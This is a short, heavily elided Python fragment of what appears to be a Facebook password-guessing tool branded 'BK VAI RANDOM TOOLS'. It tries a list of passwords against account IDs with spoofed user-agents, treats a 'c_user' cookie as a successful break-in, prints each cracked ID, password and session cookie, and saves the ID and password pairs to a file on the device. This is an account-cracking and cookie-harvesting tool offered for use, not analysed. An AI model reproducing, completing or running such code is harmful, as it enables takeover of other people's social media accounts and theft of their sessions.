...
def Main():
        os.system("clear")
        os.system('xdg-open ')
        os.system('espeak -a 300 "WELCOME TO BK VAI RANDOM TOOLS"')
        print(logo)
        ...
        for ps in pwx:
           ...
           'user-agent': pro}
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[7:22]
                print(f"\033[1;92m[NAKIB-OK🔥🖤🍎] {uid}|{ps} \nCookie[🍒] : {coki}")
                open('/sdcard/NAKIB/OK.txt', 'a').write( uid+' | '+ps+'\n')
                oks.append(uid)
                break
